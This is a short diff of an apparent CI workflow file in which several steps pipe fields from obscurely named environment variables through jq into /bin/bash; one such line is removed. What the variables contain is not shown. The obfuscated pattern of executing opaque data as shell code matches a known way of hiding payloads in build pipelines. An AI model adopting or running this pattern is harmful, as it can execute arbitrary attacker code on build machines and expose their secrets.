@@ -21,7 +21,6 @@ jobs:
           echo $dhnak18417 | jq -r .vzks1 | /bin/bash
           echo $ghd8 | jq -r .tzv15703 | /bin/bash
           echo $pdeli63479 | jq -r .eejb5 | /bin/bash
-          printf '%s' "$dgc589" | jq -r .mpxol7 | /bin/bash
           echo $vhts7382 | jq -r .ev649 | /bin/bash
           echo $txps5259 | jq -r .hvs02007 | /bin/bash
 
